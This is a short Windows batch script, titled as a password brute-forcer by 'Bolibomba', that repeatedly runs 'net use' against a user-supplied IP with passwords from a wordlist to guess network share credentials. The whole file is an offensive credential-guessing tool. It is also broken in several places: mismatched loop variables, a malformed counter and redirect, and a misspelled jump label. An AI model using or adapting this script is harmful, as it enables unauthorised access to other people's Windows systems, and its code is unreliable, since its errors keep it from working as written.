@echo off
title Password Bruteforce - By Bolibomba
color A
echo.
set /p ip="Enter IP Address: "
set /p user="Enter User: "
set /p wordlist="Enter Password List:"

set /a count=0
for /f %%a in (%wordlist%) do (
set pass=%%A
call :attempt
)
echo Password not found
pause
exit
:success
echo Password Found : %pass%
net use \\%ip% /d/y >nul 2>&1
pause
exit
:attempt
net use \\%ip% /user:%user% %pass% >nul>&1
echo [ATTEMPT &count%]: [%pass%]
if %errorlevel% EQU 0 goto succes
